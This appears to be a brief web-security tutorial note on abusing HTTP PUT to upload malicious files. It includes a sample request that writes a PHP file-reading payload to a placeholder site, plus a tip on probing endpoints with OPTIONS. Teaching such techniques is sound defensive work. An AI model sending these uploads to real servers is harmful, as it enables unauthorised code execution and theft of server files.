## Introduction
- It's worth noting that some web servers may be configured to support `PUT` requests.
- If appropriate defenses aren't in place, this can provide an alternative means of uploading malicious files, even when an upload function isn't available via the web interface.
```js
PUT /images/exploit.php HTTP/1.1 
Host: vulnerable-website.com 
Content-Type: application/x-httpd-php 
Content-Length: 49 

<?php echo file_get_contents('/path/to/file'); ?>
```

**Note** - You can try sending `OPTIONS` requests to different endpoints to test for any that advertise support for the `PUT` method.